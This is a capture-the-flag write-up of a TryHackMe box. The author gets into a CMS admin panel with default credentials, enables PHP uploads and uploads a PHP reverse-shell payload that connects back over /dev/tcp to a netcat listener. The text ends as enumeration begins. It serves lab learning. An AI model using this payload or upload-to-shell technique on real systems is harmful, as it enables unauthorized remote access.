Motivation was still high to try and tackle another CTF recently. I chose another popular easy box on TryHackMe, even though, once again, it took me like half a day to fully solve the box. The silver lining was that I got relatively far before having to consult a write-up. Even still, I learned a ton of new skills and techniques that I had not practiced in any other challenges so far!

## Getting Started

Navigating to the `/app` subdirectory, we find a "Jump" button, which throws an alert in the browser and then forwards us to `/app/castle`:

<img width="1709" height="659" alt="Bildschirmfoto 2026-07-11 um 19 34 04" src="https://github.com/user-attachments/assets/a819515b-3885-4820-8ae1-8ba5dcaad5cb" />

Here, after clicking around for some time and taking note of several user input areas, I eventually just tried logging in with some default credentials on the login page. To my amazement `admin:password` worked! 

Once in the admin-dashboard, I took a lot of time to search for possible attack surfaces, going through all subdirectories, and doing some research on the CMS version number. I didn't click any of the relevant links, but I read "file-upload" in some link. Indeed, the dashboard had a file manager to which I could upload images. More importantly, as admin, I could add "php" to the list of allowed filetypes in the settings:

<img width="1316" height="242" alt="Bildschirmfoto 2026-07-11 um 20 14 28" src="https://github.com/user-attachments/assets/8df80602-dec0-407b-a90d-7531b5135d57" />

I created a test-file called `exploit1.php` just containing the line `<?php phpinfo(); ?>`. I uploaded this and clicked the "Tracked URL" link:

<img width="756" height="617" alt="Bildschirmfoto 2026-07-11 um 20 13 50" src="https://github.com/user-attachments/assets/55325536-f233-452c-80cd-0f869eaf2bd1" />

To my surprise, this script actually ran, and showed the output of `phpinfo()`:

<img width="1265" height="572" alt="Bildschirmfoto 2026-07-11 um 20 15 18" src="https://github.com/user-attachments/assets/49286a53-c648-454e-b485-b1dccb9c441a" />

This meant I had acquired remote code execution! I quickly changed the payload to a reverse shell, i.e. 

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.162.43/9001 0>&1'");
```

Uploading this second malicious file and opening the link spawned the reverse shell:

```console
┌──(kali㉿kali)-[~/Projects/mkingdom]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.162.43] from (UNKNOWN) [10.112.172.184] 57340
bash: cannot set terminal process group (1320): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mkingdom:/var/www/html/app/castle/application/files/8217/8379/4526$ 
```

After fully upgrading my shell, I started the enumeration process and found the file `/var/www/html/app/castle/application/config/database.php`.
